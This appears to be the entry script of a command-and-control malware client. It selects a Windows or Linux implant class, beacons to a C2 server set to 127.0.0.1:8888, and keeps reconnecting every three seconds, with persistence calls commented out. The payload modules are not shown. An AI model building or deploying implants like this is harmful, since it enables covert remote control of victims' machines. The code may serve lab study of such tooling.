import platform
from windowsClient import WindowsClient
from linuxClient import LinuxClient
from client import Client
from time import sleep

if __name__ == "__main__":
    C2_IP = '127.0.0.1'
    C2_PORT = 8888
    if platform.system() == 'Windows':
        client = WindowsClient(C2_IP, C2_PORT)
        #client.persistence()
    else:
        client = LinuxClient(C2_IP, C2_PORT)
        #client.persistence()
    while not client.is_killed:
        try:
            client.connect()
        except:
            sleep(3)
            continue
